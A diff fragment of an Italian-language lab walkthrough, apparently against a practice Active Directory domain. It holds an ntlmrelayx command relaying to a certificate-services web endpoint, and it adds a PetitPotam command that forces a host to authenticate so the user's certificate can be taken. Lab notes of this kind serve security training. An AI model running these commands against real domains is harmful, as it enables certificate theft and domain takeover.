@@ -210,5 +210,5 @@ impacket-ntlmrelayx -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --
 ```
 Usa petitpoam per ottenere il certificato dell'utente che runna il sito
 ```bash
-
+python3 petitpotam.py 192.168.56.1 meereen.essos.local
 ```
